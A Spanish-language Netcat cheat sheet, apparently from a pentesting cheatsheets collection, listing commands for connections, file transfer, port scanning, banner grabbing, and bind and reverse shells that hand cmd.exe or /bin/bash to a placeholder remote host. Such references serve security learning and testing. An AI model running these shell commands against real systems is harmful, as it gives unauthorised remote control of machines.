# Netcat Cheat Sheet

#### Conectarnos a un puerto de un host

- `nc -nv <IP-ADDRESS> <PORT>`: Conexión a un host.

#### Transferir un archivo

- `nc -nvlp <PORT> > output.txt`: Host a recibir el archivo en el puerto especificado.

- `nc -nv <IP-ADDRESS> <PORT> < input.txt`: Host que envia el archivo al host destino.

#### Chatear entre hosts

- `nc -nvlp <PORT>`: Escuchando la conexión.

- `nc -nv <IP-ADDRESS> <PORT>`: Host se conecta al host al puerto abierto.

#### Bind Shell (Windows)

- `nc -nvlp <PORT> -e cmd.exe`: Escuchando la conexión.

- `nc -nv <IP-ADDRESS> <PORT>`: Conexión a la shell.

#### Bind Shell (Linux)

- `nc -nvlp <PORT> -e /bin/bash`: Escuchando la conexión.

- `nc -nv <IP-ADDRESS> <PORT>`: Conexión a la shell.

#### Reverse Shell (Windows)

- `nc -nvlp <PORT>`: Escuchando la conexión.

- `nc -nv <IP-ADDRESS> <PORT> -e cmd.exe`: Conexión al host y mandamos la shell.

#### Reverse Shell (Linux)

- `nc -nvlp <PORT>`: Escuchando la conexión.

- `nc -nv <IP-ADDRESS> <PORT> -e /bin/bash`: Conexión al host y mandamos la shell.

#### Escanear Puertos TCP

Linux:
- `nc -nvz -w 1 <IP-ADDRESS> <PORT-RANGE>`: Escanear la IP del host con el rango de puertos.

MacOS:
- `nc -nvz -w 1 -G 1 <IP-ADDRESS> <PORT-RANGE>`: Escanear la IP del host con el rango de puertos.

#### Escanear Puertos UDP

Linux:
- `nc -nvzu -w 1 <IP-ADDRESS> <PORT-RANGE>`: Escanear la IP del host con el rango de puertos.

MacOS:
- `nc -nvzu -w 1 -G 1 <IP-ADDRESS> <PORT-RANGE>`: Escanear la IP del host con el rango de puertos.

#### Banner Grabbing

- `echo "" | nc -nv -w1 <IP-ADDRESS> <PORT>`: Banner Grabbing.

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)